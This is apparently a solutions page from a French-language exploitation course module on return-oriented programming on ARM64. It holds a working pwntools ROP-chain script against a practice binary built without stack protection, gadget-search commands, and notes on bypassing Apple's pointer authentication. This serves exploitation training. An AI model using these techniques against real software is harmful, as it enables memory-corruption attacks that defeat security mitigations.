# MODULE 31 : ROP ARM64 - SOLUTIONS

## Gadgets ARM64
```bash
# Compiler
clang -arch arm64 -fno-stack-protector example.c -o example

# Trouver gadgets
ROPgadget --binary example | grep "ret"

# Gadgets utiles:
# 0x100003f80: ldp x29, x30, [sp], #0x10; ret
# 0x100003f90: mov x0, x1; ret
```

## ROP Chain
```python
from pwn import *

elf = ELF('./example')
p = process(['./example', cyclic(100)])

# Trouver offset
offset = 72

# Addresses
win_addr = elf.symbols['win']
gadget1 = 0x100003f80  # ldp x29, x30, [sp], #0x10; ret

# Chain
payload = b'A' * offset
payload += p64(gadget1)
payload += p64(0)  # x29
payload += p64(win_addr)  # x30

p.sendline(payload)
```

## PAC Bypass
Sur Apple Silicon:
- Utiliser gadgets déjà signés
- JOP (Jump-Oriented Programming)
- Réutiliser signatures existantes
